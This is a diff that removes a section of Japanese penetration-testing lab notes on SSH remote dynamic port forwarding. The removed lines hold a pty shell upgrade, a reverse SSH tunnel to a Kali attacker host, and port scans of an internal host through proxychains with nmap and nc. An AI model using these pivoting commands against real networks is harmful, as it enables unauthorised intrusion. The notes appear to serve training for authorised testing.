@@ -62,32 +62,3 @@ chmod 777 2e345e06246bd4465204327a6d6892a5-ssh_remote_client
 ```
 ![[Pasted image 20260508224111.png]]
 
-
-# SSHリモートダイナミックポートフォワーディング
-![[Pasted image 20260508224146.png]]
-リモートダイナミックポートフォワーディングは、2017年10月のOpenSSH 7.6以降でのみ利用可能になりました。ただし、この機能を使用するにはOpenSSHクライアントのバージョンが7.6以上である必要があります。サーバーのバージョンは関係ありません。
-
-![[Pasted image 20260508224153.png]]
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-ssh -N -R 9998 kali@192.168.45.236
-
-tail /etc/proxychains.conf
-```
-![[Pasted image 20260508224201.png]]
-
-```bash
-proxychains nmap -vvv -sT -p9000-9100 -Pn -n 10.4.158.64
-
-#nmapがダメな時の代替手段
-proxychains -q nc -zv 10.4.158.64 9000-9100 -w 3
-```
-![[Pasted image 20260508224206.png]]
-## Lab
-```bash
-chmod 777 ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client
-
-proxychains ./ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client -i 10.4.158.64 -p 9062
-```
-![[Pasted image 20260508224212.png]]
